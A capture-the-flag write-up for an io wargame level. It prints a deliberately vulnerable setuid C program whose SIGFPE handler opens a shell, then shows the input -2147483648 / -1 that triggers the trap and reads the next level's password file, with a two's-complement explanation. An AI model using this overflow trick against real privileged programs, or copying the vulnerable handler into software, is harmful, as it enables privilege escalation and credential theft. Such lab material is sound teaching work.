1. Check out the source file to see what we need to do:
   ```
   //a little fun brought to you by bla
   
   #include <stdio.h>
   #include <stdlib.h>
   #include <signal.h>
   #include <setjmp.h>
   
   void catcher(int a)
   {
        setresuid(geteuid(),geteuid(),geteuid());
        printf("WIN!\n");
        system("/bin/sh");
        exit(0);
   }
   
   int main(int argc, char **argv)
   {
        puts("source code is available in level02.c\n");
   
        if (argc != 3 || !atoi(argv[2]))
            return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
   }
   ```

2. We see that there's a signal to catch a SIGFPE: a floating point exception.
   Something like this can be caused by dividing by zero or some other similar
   exception (as you'll see below). We also see that there's a check to make sure
   we supply two command line arguments, and the second argument can not be zero.
   As the final return line shows, the first argument is dividied by the second
   and the absolute value of this operation is returned. Since argv[2] can't be
   zero, we need to find some other way to cause an exception.

3. Now here's the solution:
   ```
   level2@io:/levels$ ./level02 -2147483648 -1
   source code is available in level02.c

   WIN!
   sh-4.2$ cat /home/level3/.pass
   [Password to level3]
   ```

* To be perfectly honest, I'm not totally sure why this works. I played around with
these numbers for a little while and I just happened to get the right ones. I'll
look into a bit more to figure out exactly why this causes a SIGFPE.

Update: After doing some more playing in gdb and refreshing my mind a bit, I think I
understand the issue. Signed numbers are represented by the most significant
bit being 1. So the number 2147483647 is:
`0x7fffffff -> 0111 1111 1111 1111 1111 1111 1111 1111`
and that is the largest positive 32 bit signed integer value. So when we add 1 to
it it becomes 2147483648 which is represented as:
`0x80000000 -> 1000 0000 0000 0000 0000 0000 0000 0000`
Now we've overflowed and we have a very large negative number. When diving by -1,
you give the dividend the opposite sign. So when we try to take the opposite sign
of -2147483648 the answer would obviously be 2147483648. The problem there is that
that number can't be represented in the world of 32 bit signed integers! Hence the
SIGFPE. I believe that's the full explanation.
